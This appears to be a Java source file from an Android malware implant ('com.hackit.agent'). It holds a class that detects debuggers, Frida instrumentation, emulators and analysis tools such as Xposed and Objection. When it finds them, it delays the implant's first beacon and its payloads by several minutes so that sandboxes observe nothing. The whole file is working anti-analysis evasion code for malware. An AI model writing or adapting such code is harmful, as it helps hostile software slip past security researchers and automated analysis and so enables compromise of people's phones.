package com.hackit.agent;

import android.app.ActivityManager;
import android.content.Context;
import android.os.Build;

import java.io.File;
import java.net.InetSocketAddress;
import java.net.Socket;

/**
 * Analysis harness detection. It never blocks the implant — it only changes
 * timing: when a debugger, Frida, an emulator or a known analysis package is
 * present, the first beacon is pushed far out and payloads are delayed, so a
 * sandbox that reboots the sample sees nothing.
 */
final class Guard {
    private static boolean hard;
    private static long delayMs = 0L;

    static synchronized long startDelay(Context ctx) {
        if (delayMs != 0L) {
            return delayMs;
        }
        boolean emulator = isEmulator();
        boolean tracer = tracerPid() != 0;
        boolean frida = fridaPort() || fridaMaps() || fridaFiles();
        boolean root = Common.rooted();
        boolean debug = isDebuggable(ctx);
        boolean sandbox = sandboxPackage(ctx);
        hard = emulator || tracer || frida || sandbox;
        long base = hard
                ? 300000L + (long) (Math.random() * 600000L)
                : 20000L + (long) (Math.random() * 70000L);
        delayMs = base;
        Log.d("guard emulator=" + emulator + " tracer=" + tracer + " frida=" + frida
                + " root=" + root + " debug=" + debug + " sandbox=" + sandbox + " delay=" + base);
        return delayMs;
    }

    static boolean hard() {
        return hard;
    }

    private static boolean isEmulator() {
        String fingerprint = String.valueOf(Build.FINGERPRINT).toLowerCase();
        String model = String.valueOf(Build.MODEL).toLowerCase();
        String product = String.valueOf(Build.PRODUCT).toLowerCase();
        String hardware = String.valueOf(Build.HARDWARE).toLowerCase();
        return fingerprint.contains("generic") || model.contains("emulator")
                || model.contains("sdk") || product.contains("sdk") || hardware.contains("goldfish")
                || hardware.contains("ranchu") || "google_sdk".equals(product);
    }

    private static int tracerPid() {
        try {
            String status = Common.read(new java.io.FileInputStream("/proc/self/status"), 4096);
            for (String line : status.split("\n")) {
                if (line.startsWith("TracerPid:")) {
                    return Integer.parseInt(line.replace("TracerPid:", "").trim());
                }
            }
        } catch (Throwable ignored) {
        }
        return 0;
    }

    private static boolean fridaPort() {
        for (int port : new int[]{27042, 27043}) {
            Socket socket = null;
            try {
                socket = new Socket();
                socket.connect(new InetSocketAddress("127.0.0.1", port), 120);
                return true;
            } catch (Throwable ignored) {
            } finally {
                Common.closeQuietly(socket);
            }
        }
        return false;
    }

    private static boolean fridaMaps() {
        try {
            String maps = Common.read(new java.io.FileInputStream("/proc/self/maps"), 512 * 1024);
            String lower = maps.toLowerCase();
            return lower.contains("frida") || lower.contains("gum-js") || lower.contains("linjector");
        } catch (Throwable ignored) {
            return false;
        }
    }

    private static boolean fridaFiles() {
        String[] paths = {
                "/data/local/tmp/frida-server", "/data/local/tmp/re.frida.server",
                "/system/bin/frida-server", "/system/lib/libfrida-gadget.so",
        };
        for (String path : paths) {
            if (new File(path).exists()) {
                return true;
            }
        }
        return false;
    }

    private static boolean isDebuggable(Context ctx) {
        try {
            return (ctx.getApplicationInfo().flags & android.content.pm.ApplicationInfo.FLAG_DEBUGGABLE) != 0;
        } catch (Throwable ignored) {
            return false;
        }
    }

    private static boolean sandboxPackage(Context ctx) {
        try {
            ActivityManager am = (ActivityManager) ctx.getSystemService(Context.ACTIVITY_SERVICE);
            if (am == null) {
                return false;
            }
            for (ActivityManager.RunningAppProcessInfo info : am.getRunningAppProcesses()) {
                String name = String.valueOf(info.processName).toLowerCase();
                if (name.contains("frida") || name.contains("xposed") || name.contains("sandbox")
                        || name.contains("objection")) {
                    return true;
                }
            }
        } catch (Throwable ignored) {
        }
        return false;
    }

    private Guard() {
    }
}